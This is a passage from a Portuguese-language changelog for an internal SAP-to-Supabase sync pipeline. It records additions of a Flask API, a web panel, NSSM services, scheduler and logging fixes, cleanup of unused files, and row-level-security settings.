- **Botão "🗑 limpar"** ao lado do campo Nº do pedido (NPED), para esvaziar a lista.

### Documentação

- README: nova seção **Monitoramento** (`/health` e `/status` com as flags `?checks=` e
  `?strict=1`) + entrada no índice.

## [2026-06-29] — Painel: "Buscar na Lista" + chave de acesso recolhível

### Adicionado

- **Botão "📋 Buscar na Lista"** na coluna de Ordens de Serviço: abre um modal com até
  **30 pedidos com OS criada** no SAP (`NPED · cliente · nº OS · data`), com seleção
  múltipla ("selecionar todos") e **↻ atualizar**. Os escolhidos entram no campo NPED
  **separados por vírgula**, somando sem duplicar ao que já estiver lá.
  - Backend: função `listar_pedidos_com_os(limit=30)` (query em `OWOR` LEFT JOIN `ORDR`
    p/ o `CardName`; `OriginNum > 0 AND Status <> 'C'` exclui OS canceladas; mais recentes
    primeiro por `MAX(DocEntry)`) + endpoint `GET /ordens-servico/disponiveis` (exige `X-API-Key`).
- **Cartão da chave de acesso recolhível**: cadeado (🔒/🔓) no canto direito do cabeçalho
  mostra/oculta o card. **Oculto por padrão** ao carregar; acessível
  (`aria-expanded`/`aria-controls`). "Buscar na Lista" sem chave abre o card automaticamente.

## [2026-06-29] — Faxina: remoção de planos, docs e deploy não usado

### Removido

- **Docs de planejamento** de features já concluídas: `PLANO_PAINEL_OPORTUNIDADES.md` e
  `PLANO_SYNC_ORDENS_SERVICO.md` (links no README/GUIA ajustados).
- **Suporte Docker** (deploy real é NSSM/Windows): `Dockerfile`, `docker-compose.yml`,
  `.dockerignore` + badge/TOC/seção no README.
- **`run_all.bat`** — launcher manual que brigava pela porta 8077 com os serviços NSSM.
  Use `install_services.bat`; ou, para teste, `run_scheduler.bat`/`run_api.bat` isolados.
- **`scripts/test_connections.py` + `setup.sh`** — diagnóstico/setup que executava conexões
  **reais** durante o `pytest`. Suíte agora roda **113 testes**, sem chamadas externas.
- Bytecode órfão em `__pycache__` (`exemplo_avancado`, `pandas_guide` — `.py` já inexistentes).

## [2026-06-29] — Log deixa de ser configurado no import

### Corrigido

- **Logging só no entrypoint, não no import.** `scheduled_execution.py`, `api.py` e os dois
  `extract_*.py` chamavam `logging.basicConfig` no nível do módulo — então **importar** o
  módulo (ex.: na suíte de testes) redirecionava todo o log da sessão para o arquivo de
  produção (`logs/scheduled_execution.log` / `logs/api.log`). A configuração foi movida para
  uma função `_configure_logging()` chamada só no `main`/`__main__`. Verificado: rodar a
  suíte completa não escreve mais nos logs de produção. (Nota: servir via
  `waitress-serve api:app` não passa por `main()` — use `python api.py` para ter o log em
  arquivo.)

### Documentação

- README: nota para ler os logs no **PowerShell** com `-Encoding utf8` (são UTF-8; sem isso
  os acentos saem trocados, ex.: `execuÃ§Ã£o`).

## [2026-06-29] — Limpeza: config morta + dedupe de helpers

### Removido

- **`DIAS_SEMANA`** (env/config) — era validado mas **nunca aplicado**: o agendador
  decide rodar só por `is_business_day` (seg–sex menos feriados BR), então `DIAS_SEMANA`
  não restringia nada (config enganosa). Removidos `parse_dias_semana`, `DIAS_SEMANA_RE`,
  `DOW_CRON`, `DIAS_SEMANA_DEFAULT`, o campo `Settings.dias_semana` e as menções em
  `.env.example`, `README.md` e `docker-compose.yml`. A regra continua a mesma:
  **dias úteis (seg–sex, sem feriados nacionais)**.
- **Aliases bilíngues duplicados** em `scripts/scheduled_execution.py`
  (`esta_na_janela_comercial`, `pode_executar_carga`, `_parse_dias_semana` e o parâmetro
  `dias_semana` descartado) — ficam só as funções canônicas `is_within_commercial_window`
  e `can_run_load`. Testes ajustados para os nomes canônicos.

## [2026-06-29] — Correção: agendador não subia (ModuleNotFoundError)

### Corrigido

- **`run_scheduler.bat`** passa a iniciar o agendador como módulo
  (`python -m scripts.scheduled_execution`) em vez de `python scripts\scheduled_execution.py`.
  Rodar o arquivo direto colocava apenas a pasta `scripts\` no `sys.path`, então a 1ª linha
  `import scripts._bootstrap` quebrava com `ModuleNotFoundError: No module named 'scripts'` —
  o processo morria na largada. Como serviço NSSM isso aparecia como `SERVICE_PAUSED` e, na
  prática, **o sincronismo agendado de oportunidades (a cada 30 min, 07–18h, dias úteis) nunca
  rodava**; só o "Forçar sincronismo" (via API, sem apscheduler) funcionava. A API não era
  afetada porque `api.py` fica na raiz do projeto.

## [2026-06-26] — Painel unificado + Oportunidades

### Adicionado

- **Painel unificado** em `GET /` (2 colunas): **Ordens de Serviço** (por NPED, sob demanda)
  e **Oportunidades** (carga completa agendada). Chave única compartilhada na página.
- **Endpoints de oportunidades** (`api.py`): `GET/DELETE /oportunidades/historico` (lê/limpa
  o `sincronizacao_log`), `GET /oportunidades/info` (total de linhas na tabela + agenda
  intervalo/janela) e `POST /oportunidades/sincronizar` (**força** a carga completa — a
  mesma do agendador). Todos exigem `X-API-Key`. A coluna de Oportunidades mostra
  "📊 N linhas · 🕑 a cada 30 min · 07–18h · dias úteis".
- **Lock de arquivo cross-process** (`pipeline_core.oportunidades_sync_lock`, lib `filelock`)
  compartilhado entre o agendador (`scripts/scheduled_execution.py`) e o "forçar sincronismo"
  da API: nunca rodam duas cargas snapshot de oportunidades ao mesmo tempo (a 2ª recebe `409`
  / o agendado pula). Dependência `filelock` no `requirements.txt`; `.locks/` no `.gitignore`.
- **`run_all.bat`** — launcher único que sobe `run_scheduler.bat` + `run_api.bat`.
- **`install_services.bat`** — registra agendador + API como **serviços NSSM** (auto-start
  no boot, restart automático se cair, log em arquivo com rotação). Para o servidor não
  depender de janela manual / sobreviver a reboot.
- **Log em arquivo na API** (`logs/api.log`, `TimedRotatingFileHandler`, rotação diária,
  12 dias) além do console — o log persiste ao fechar a janela / rodar como serviço.

### Alterado

- `_fetch_log`/`_clear_log` da API passam a receber o **nome da tabela** (servem OS e
  oportunidades). Página reescrita (layout de 2 colunas, mantendo toda a função de OS).

Plano e decisões: `PLANO_PAINEL_OPORTUNIDADES.md`. Suíte: **123 testes**.

## [2026-06-25] — API de disparo + endurecimento (pós-revisão)

### Adicionado

- **API HTTP** (`api.py`, Flask) para o app disparar a sync por NPED:
  `POST /sync/ordens-servico/<nped>`, `POST /sync/ordens-servico` (corpo
  `{"nped": N}` ou `{"npeds": [...]}`) e `GET /health`. Autenticação **opcional** por
  `OS_API_KEY` (header `X-API-Key` ou `Authorization: Bearer`); cargas **serializadas**
  por lock; respostas `200/207/400/401/502`. Config `OS_API_*`; `flask`/`waitress` no
  `requirements.txt`; testes em `tests/test_api.py`.
- **`run_api.bat`** — wrapper para subir a API no boot do servidor (Task Scheduler
  ONSTART / NSSM), espelhando o `run_scheduler.bat`. Instruções no README e no GUIA §6.1.
- **Página amigável** (`web/sincronizar.html`) servida em `GET /`: campo do nº do pedido +
  chave (com "lembrar") + botão **Sincronizar** (aceita vários pedidos, mostra resultado).
  Sem dependências, same-origin (sem CORS). Rota `GET /favicon.ico` → 204.
- **Histórico das últimas sincronizações**: endpoint `GET /historico` (lê a tabela de log
  via service_role; requer `X-API-Key`; `?limit=N`, default 20, máx 100) e seção
  "Últimas sincronizações" na página (atualiza após cada disparo e tem botão ↻).
  **Limpar histórico**: endpoint `DELETE /historico` (apaga o log; requer `X-API-Key`) +
  botão 🗑 na página (com confirmação).
- **Diagnóstico "OS não gerada" / "OS cancelada"**: `diagnosticar_nped` consulta a `OWOR`
  (`OriginNum` = nº do pedido) **antes** de sincronizar. Sem OP → `tipo: "sem_os"`; todas
  as OPs com `Status='C'` → `tipo: "cancelada"`. Nesses casos a API **não** tenta a carga
  (sem log de falha) e a página mostra selo âmbar **SEM OS** / **CANCELADA**. O batch passa
  a responder `200`/`207` (sem `502`).
- **`pipeline_core.coerce_positive_int`** (regex `^\d+$` + `> 0`) — validação de NPED
  reutilizada por `extract`/`export`/`api` (rejeita negativo, zero, sinal e decimal).
  Testes em `tests/test_pipeline_core.py`.

### Alterado

- Logger `httpx` rebaixado para `WARNING` nos entrypoints de OS (logs de produção
  sem a URL gigante por requisição).
- `export_os_json` valida os NPEDs antes de filtrar no PostgREST.

Total da suíte: **106 testes passando**.

## [2026-06-25] — Ordens de Serviço de Engenharia

Novo pipeline **independente** do de oportunidades: sincroniza Ordens de Serviço do
SAP para o Supabase **sob demanda, por `NPED`**, e exporta para JSON. Reaproveita o
"motor" do projeto via um núcleo compartilhado, sem alterar o comportamento do
pipeline de oportunidades.

### Adicionado

- **`extract_ordens_servico_engenharia.py`** — sincroniza a view SAP
  `VW_EXPORT_ORDENS_SERVICO_1` por `NPED` (um ou vários), no modo **`replace_nped`**
  (carrega-depois-poda **escopado ao pedido**: não duplica e não toca nos demais).
  Sem enriquecimento SQL Server / sem `SITCOD`.
- **`pipeline_core.py`** — núcleo genérico extraído de `extract_sap_to_supabase.py`
  (`SupabaseLoader`, `prepare_data`, `with_retries`, `build_view_query`,
  `validate_sql_identifier`). `SupabaseLoader.delete_other_executions` ganhou
  `where_eq=` (poda escopada) e `registrar_sincronizacao` ganhou `extra_fields=`.
- **`export_os_json.py`** — exporta a tabela já sincronizada para JSON (por `NPED`
  ou `--all`), com `--slim` (remove textos NCLOB), `--compact`, `--array`,
  `--no-status`, `-o/--output` e `--stdout`. Adiciona `status_desc`; grava UTF-8 legível.
- **`sql/ordens_servico_engenharia.sql`** — DDL idempotente das 3 tabelas
  (`ordens_servico_engenharia`, lookup `status_ordens_servico_eng`, log
  `sincronizacao_log_os_eng`), já com o seed do status.
- **Configuração `OS_*`** em `config.py` / `.env.example` (view, tabela, lookup, log,
  modo, batch).
- **Testes** sem credenciais: `tests/test_ordens_servico_eng.py`,
  `tests/test_export_os_json.py` (total da suíte: **75 passando**).
- **Documentação**: `GUIA_ORDENS_SERVICO_ENGENHARIA.md` (didático, com exemplos e
  saídas reais), `PLANO_SYNC_ORDENS_SERVICO.md` (decisões de projeto) e nova seção no
  `README.md`.

### Alterado

- **`extract_sap_to_supabase.py`** passou a **importar** o núcleo de `pipeline_core.py`
  em vez de definir as funções localmente — mudança *behavior-preserving* (a API
  pública `from extract_sap_to_supabase import ...` continua funcionando).
- **`.gitignore`** ignora `exports/` (os JSONs exportados contêm dados de cliente).

### Segurança

- As 3 tabelas usam **RLS `ENABLE` + `FORCE` sem nenhuma policy** → acesso **somente**
  via `service_role` (backend). `anon`/`authenticated` ficam sem acesso. Decisão e
  racional (lições do Security Advisor: evita *RLS Policy Always True*, *Extension in
  Public*, *SECURITY DEFINER*) documentados em `PLANO_SYNC_ORDENS_SERVICO.md §5.5`.
